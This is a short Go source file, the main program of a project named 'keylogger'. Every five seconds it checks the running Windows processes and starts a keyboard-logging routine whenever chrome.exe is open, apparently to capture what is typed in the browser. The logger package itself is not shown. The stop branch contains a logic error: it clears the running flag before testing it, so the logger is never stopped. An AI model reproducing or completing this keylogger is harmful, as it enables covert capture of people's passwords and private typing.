package main

import (
	"keylogger/pkg/keyboardlogger"
	"keylogger/pkg/winprocessutils"
	"log"
	"time"
)

func main() {
	var loggerRunning bool = false
	for {
		procs, err := winprocessutils.Processes()
		if err != nil {
			log.Fatal(err)
		}
		chrome := winprocessutils.FindProcessByName(procs, "chrome.exe")
		if chrome != nil {
			if !loggerRunning {
				go keyboardlogger.StartKeyboardLogger()
				loggerRunning = true
			}
		} else {
			loggerRunning = false
			if loggerRunning {
				go keyboardlogger.StopKeyboardLogger()
				loggerRunning = false

			}
		}
		time.Sleep(5 * time.Second)
	}

}
